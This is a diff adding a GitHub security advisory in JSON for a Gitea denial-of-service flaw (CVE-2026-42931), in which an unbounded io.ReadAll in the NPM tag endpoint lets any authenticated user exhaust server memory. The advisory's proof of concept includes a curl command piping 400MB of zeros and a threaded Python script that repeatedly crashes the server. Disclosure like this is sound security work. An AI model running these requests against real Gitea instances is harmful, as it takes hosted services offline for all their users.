@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-wwqq-x6w4-frm2",
+  "modified": "2026-07-21T20:45:36.669792555Z",
+  "published": "2026-07-21T20:39:37Z",
+  "aliases": [
+    "CVE-2026-42931"
+  ],
+  "summary": "Gitea: Denial of Service via Unbounded io.ReadAll in NPM Package Tag Endpoint",
+  "details": "### Summary\nAn unbounded `io.ReadAll(ctx.Req.Body)` call in the NPM package tag API endpoint allows any authenticated user to crash the Gitea server by sending a single large HTTP request. The request body is read entirely into memory with no size limit, causing an Out-of-Memory (OOM) kill. With concurrent requests, the attack produces a persistent denial of service that survives automatic restarts.\n\n### Details\nThe [`AddPackageTag`](https://github.com/go-gitea/gitea/blob/a12f9807933bd463368c6111dbc283d8a65f20f7/routers/api/packages/npm/npm.go#L336) function reads the entire HTTP request body into memory using `io.ReadAll()` with no size validation:\n\n```go\n// routers/api/packages/npm/npm.go:332-341\nfunc AddPackageTag(ctx *context.Context) {\n    packageName := packageNameFromParams(ctx)\n\n    body, err := io.ReadAll(ctx.Req.Body)  // NO SIZE LIMIT\n    if err != nil {\n        apiError(ctx, http.StatusInternalServerError, err)\n        return\n    }\n    version := strings.Trim(string(body), \"\\\"\")\n    // ...\n}\n```\n\nThis route is registered at [`routers/api/packages/api.go:433`](https://github.com/go-gitea/gitea/blob/a12f9807933bd463368c6111dbc283d8a65f20f7/routers/api/packages/api.go#L433):\n```go\nr.Group(\"/-/package/{id}/dist-tags\", func() {\n    // ...\n    r.Group(\"/{tag}\", func() {\n        r.Put(\"\", npm.AddPackageTag)    // reqPackageAccess(perm.AccessModeWrite)\n        r.Delete(\"\", npm.DeletePackageTag)\n    })\n})\n```\n\n**Why this causes OOM and not just a slow request:**\n\nIn Go, `io.ReadAll()` reads into a `[]byte` that grows dynamically. When the incoming data exceeds available memory, the Go runtime attempts to allocate a larger backing array. This allocation fails, triggering an unrecoverable `runtime.throw(\"out of memory\")` that kills the entire process, not just the goroutine handling the request.\n\n**No server-side size limits apply to this endpoint:**\n\nGitea has per-type size limits (e.g., `LIMIT_SIZE_NPM`) defined in [`modules/setting/packages.go`](https://github.com/go-gitea/gitea/blob/a12f9807933bd463368c6111dbc283d8a65f20f7/modules/setting/packages.go#L35), but these are only enforced during `UploadPackage`, not in `AddPackageTag`. The [`mustBytes()`](https://github.com/go-gitea/gitea/blob/a12f9807933bd463368c6111dbc283d8a65f20f7/modules/setting/packages.go#L96-L108) function defaults all limits to `-1` (unlimited) when not explicitly configured:\n```go\n// modules/setting/packages.go:96-101\nfunc mustBytes(section ConfigSection, key string) int64 {\n    const noLimit = \"-1\"\n    value := section.Key(key).MustString(noLimit)  // defaults to \"-1\"\n    if value == noLimit {\n        return -1\n    }\n```\n\nEven if an admin sets `LIMIT_SIZE_NPM`, it would not protect this endpoint. `AddPackageTag` never checks any size limit before calling `io.ReadAll()`.\n\nThe Gitea HTTP server has no global request body size limit. The [`HashedBuffer`](https://github.com/go-gitea/gitea/blob/a12f9807933bd463368c6111dbc283d8a65f20f7/modules/packages/hashed_buffer.go#L20-L33) used for package uploads (which does have a 32MB memory buffer before spilling to disk) is not used for this endpoint. `AddPackageTag` reads the body directly via `io.ReadAll()`, bypassing all buffer protections:\n\n```go\n// modules/packages/hashed_buffer.go:29-33\nconst DefaultMemorySize = 32 * 1024 * 1024  // 32MB, which is safe and spills to disk\n\n// but npm.go:336 bypasses this entirely:\nbody, err := io.ReadAll(ctx.Req.Body)  // reads everything into RAM, no limit\n```\n\n**Access requirements:**\n\n- The route requires `reqPackageAccess(perm.AccessModeWrite)` \n- Any user has write access to their own package namespace ([`services/context/package.go:155-157`](https://github.com/go-gitea/gitea/blob/a12f9807933bd463368c6111dbc283d8a65f20f7/services/context/package.go#L155-L157)):\n  ```go\n  if doer.ID == pkgOwner.ID {\n      accessMode = perm.AccessModeOwner\n  }\n  ```\n- No NPM package needs to exist. The OOM occurs at line 336 before the [package lookup at line 343](https://github.com/go-gitea/gitea/blob/a12f9807933bd463368c6111dbc283d8a65f20f7/routers/api/packages/npm/npm.go#L343):\n  ```go\n  body, err := io.ReadAll(ctx.Req.Body)  // line 336; OOM happens here\n  // ...\n  pv, err := packages_model.GetVersionByNameAndVersion(...)  // line 343, which is never reached\n  ```\n\n### PoC\n\n**Tested Environment:**\n- Gitea instance (tested on v1.26.2 Docker, confirmed in source up to v1.27.0-dev)\n\n**Prerequisites: Set up test environment**\n\n```yaml\n# docker-compose.yml\nversion: \"3\"\nservices:\n  gitea:\n    image: gitea/gitea:latest\n    container_name: gitea-dos-test\n    environment:\n      - GITEA__database__DB_TYPE=sqlite3\n      - GITEA__service__DISABLE_REGISTRATION=false\n    ports:\n      - \"3000:3000\"\n    deploy:\n      resources:\n        limits:\n          memory: 512M\n```\n\n```bash\ndocker compose up -d\n# Complete initial setup in browser at http://localhost:3000\n# Register a user account (e.g., user1 / Password123!)\n```\n\n**Step 1: Single request OOM crash**\n\n```bash\n# Send ~80% of container memory to the AddPackageTag endpoint.\n# The body is read entirely into memory via io.ReadAll().\n# For 512MB container: count=400 (~400MB) is enough.\n# For larger containers, scale accordingly (e.g., count=800 for 1GB, count=1600 for 2GB).\n# The package owner in the URL must match the authenticated user's username.\ndd if=/dev/zero bs=1M count=400 | curl -u \"user1:Password123!\" \\\n  -X PUT \\\n  -H \"Content-Type: application/json\" \\\n  --data-binary @- \\\n  \"http://localhost:3000/api/packages/user1/npm/-/package/anything/dist-tags/latest\" \\\n  --max-time 120\n```\n\n**Step 2: Verify server crash**\n\n```bash\n# Check if server responds\ncurl -s -o /dev/null -w \"%{http_code}\" http://localhost:3000/api/v1/version\n# Expected: connection refused (server is dead)\n```\n\n**Step 3: Persistent DoS via concurrent requests (survives restart policies)**\n\n```python\n# Even with restart: always, concurrent attacks re-kill on startup\nimport threading, requests, itertools\n\npayload = open('/tmp/p', 'rb').read() if __import__('os').path.exists('/tmp/p') else b'\\x00' * (500 * 1024 * 1024)\ni = itertools.count(1)\n\ndef worker():\n    s = requests.Session()\n    while True:\n        n = next(i)\n        try:\n            s.put(\n                f\"http://localhost:3000/api/packages/user1/npm/-/package/pkg{n}/dist-tags/latest\",\n                data=payload,\n                auth=(\"user1\", \"A@12345678\"),\n                timeout=120\n            )\n        except Exception:\n            pass\n\nfor _ in range(20):\n    threading.Thread(target=worker, daemon=True).start()\n\n__import__('signal').pause()\n```\n\n### One 400MB upload triggers OOM kill\n\nhttps://github.com/user-attachments/assets/a7ba4566-56d5-41ba-ad9f-7e23045fa0f6\n\n### Crash loop after OOM with Docker restart policy\n\nhttps://github.com/user-attachments/assets/9211649f-e10c-4b78-a1e5-223ab90d04a7\n\n**Observed result on Gitea 1.26.2:**\n- Server logs: `Received signal 15; terminating.`\n- Container status: `Exited (0)`\n- Server remains down until manual restart\n- With `restart: always`, server restarts but can be immediately re-killed\n\n### Impact\n**Who is impacted:**\n- All Gitea instances with the package registry enabled (enabled by default)\n- Any authenticated user can crash the server (No admin privileges required)\n- With self-registration enabled (default), an unauthenticated attacker can register an account and immediately crash the server\n- All users of the Gitea instance lose access to repositories, CI/CD, issues, and all hosted services\n\n**Attack characteristics:**\n- **Single request** is sufficient to crash the server\n- **No special payload**: raw zeros work (no compression tricks needed)\n- **Persistent** multiple requests can re-kill the server even after auto-restart\n- **Minimal bandwidth**: attacker sends ~80% of the server's available memory in a single request to crash it (e.g., ~400MB for a 512MB instance, ~1.6GB for a 2GB instance)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.gitea.io/gitea",
+        "purl": "pkg:golang/code.gitea.io/gitea"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.27.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-wwqq-x6w4-frm2/GHSA-wwqq-x6w4-frm2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-wwqq-x6w4-frm2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-gitea/gitea"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/releases/tag/v1.27.0"
+    }
+  ]
+}
